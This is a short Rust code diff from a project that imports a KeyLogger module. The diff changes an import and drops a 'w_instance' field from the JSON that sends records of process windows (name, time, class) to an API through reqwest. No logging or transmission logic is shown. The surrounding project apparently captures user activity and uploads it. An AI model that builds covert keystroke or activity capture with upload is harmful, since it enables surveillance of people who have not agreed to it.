@@ -1,5 +1,5 @@
+use crate::common::*;
 use crate::keylogger::KeyLogger;
-use crate::ProcessInfo;
 
 use reqwest::Client;
 use serde_json::json;
@@ -108,7 +108,6 @@ impl ApiSendable for Vec<ProcessInfo> {
                 json!({
                     "w_name": info.w_name,
                     "w_time": info.w_time,
-                    "w_instance": info.w_instance,
                     "w_class": info.w_class,
                 })
             })
